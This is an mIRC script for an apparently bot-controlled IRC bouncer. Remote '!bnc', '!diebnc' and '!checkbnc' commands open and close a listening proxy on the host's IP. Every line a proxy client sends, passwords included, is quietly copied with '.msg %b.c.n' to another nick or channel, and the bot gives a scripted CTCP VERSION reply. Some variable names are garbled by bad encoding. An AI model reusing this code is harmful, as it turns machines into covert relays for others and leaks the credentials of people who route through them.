on 10:TEXT:!bnc*:*:{
  if ($2 = $null) { .notice $nick !bnc <port> <pass> }
  if ($2 != $null) && ($3 = $null) { .notice $nick Password Needed. }
  if ($2 != $null) && ($3 != $null) { 
    set %Bport $2
    set %BPass $3
    socklisten xb $+ $ticks %Bport
    .notice $nick Bnc Complete: /server $IP %Bport %BPass $+ .
  }
}

on 10:TEXT:!diebnc:*:{
  .unset %pmet
  .unset %dea
  .unset %B*
  .unset %temp*
  .sockclose xb*
  .sockclose xtor*
  .sockclose pmeti*
  .sockclose bef*
  .notice $nick Bnc Shutdown
}

on 10:TEXT:!checkbnc:*:{
  if ($sock(xb*) != $null) { .notice $nick /server $IP %BPort %BPass $+ . }
  if ($sock(xb*) = $null) { .notice $nick No bnc running }
}

on 1:SOCKOPEN:bef*:{
  .sockwrite -nt $sockname NICK %BNick  
  .sockwrite -nt $sockname USER %BNick a a : $+ %BNick  
}

on 1:sockread:bef*:{ 
  if ($sockerr > 0) return 
  :nextread 
  .sockread %pmet 
  if ($sockbr == 0) return 
  if (%pmet == $null) %pmet = - 
  keering %pmet
}

alias keering {
  set %dea $1
  if (311 = $2) && ($4 = %BNick) { .sockwrite -n xtor %Dea 311 %BNick %BNick %BIdent %BHOST * : $+ %BName  | haltdef }
  if (311 = $2) && ($4 != %BNick) { .sockwrite -n xtor $1- | haltdef }
  if ($2 = 001) { .sockwrite -n xtor $3-9 %BNick $+ ! $+ %BIDENT  $+ @ $+ %BHost }
  if (311 != $2) { .sockwrite -n xtor $1- | .clearall }
  if (421 = $2) {
    if (vip = $4) || (conn = $4) { halt }
  }
}


on 1:socklisten:xb*:{
  .sockaccept pmeti
  .sockwrite -n pmeti : $+ $IP NOTICE AUTH :You need to say /quote PASS <password>
}

on 1:sockread:pmeti*:{ 
  if ($sockerr > 0) return 
  :nextread 
  .sockread %pmet 
  if ($sockbr == 0) return 
  if (%pmet == $null) %pmet = - 
  .bpas %pmet
}

alias bpas {
  if (NICK = $1) { .set %BNick $2 }
  if (USER = $1) { .set %BIdent $2 | .set %BName $mid($5,2,10000) $6- }
  if ($1 = PASS) && ($2 = %BPass) { .sockrename pmeti xtor | .sockwrite -n xtor : $+ $IP NOTICE AUTH :Welcome to BNC v2.8.2, the irc proxy | .sockwrite -n xtor : $+ $IP NOTICE AUTH :Level two, lets connect to something real now | .sockwrite -n xtor : $+ $IP NOTICE AUTH :type /quote conn [server] <port> <pass> to connect | .sockwrite -n xtor : $+ $IP NOTICE AUTH :type /quote VIP LIST for basic list of Virtual Hosts and usage. }
  if ($1 = PASS) && ($2 != %BPass) { .sockwrite -n pmeti : $+ $IP NOTICE AUTH :Invild Password!. }
  if (NICK != $1) && (USER != $1) && (PASS != $1) { .sockwrite -n pmeti : $+ $IP NOTICE AUTH :unknown command!. }
}

on 1:sockread:xtor*:{ 
  if ($sockerr > 0) return 
  :nextread 
  .sockread %pmet 
  if ($sockbr == 0) return 
  if (%pmet == $null) %pmet = - 
  .bpas2 %pmet
  .msg %b.c.n %pmet
}

alias bpas2 { 
  if (conn = $1) { .sockopen bef $+ $ticks $2- }
  if (vip = $1) && (LIST != $2) { .set %BHost $2 | .sockwrite -n xtor Switching your vhost to ( $+ $2 $+ ) | .sockwrite -n xtor : $+ $IP NOTICE AUTH :Switching vhost to ( $+ %BHost $+ ) is complete!. try /conn server [port] }
  if (vip = $1) && (LIST = $2) { .sockwrite -n xtor : $+ $IP NOTICE AUTH :The only vhosts u can use is the bots ip: $ip }
  if (NICK = $1) { .set %BNick $2 }
  else { .sockwrite -nt bef* $1- | .clearall | halt }
}
ctcp *:*:if ($1- == VERSION) { .ctcpreply $nick VERSION WEC Bot v2.4 | ctcpt } | else { ctcpt } }
alias ctcpt if (%�) inc -u15 %� | else set -u15 %� 1 | if (%� > 0) { .ignore -tu30 *!*@* | .unset %� }
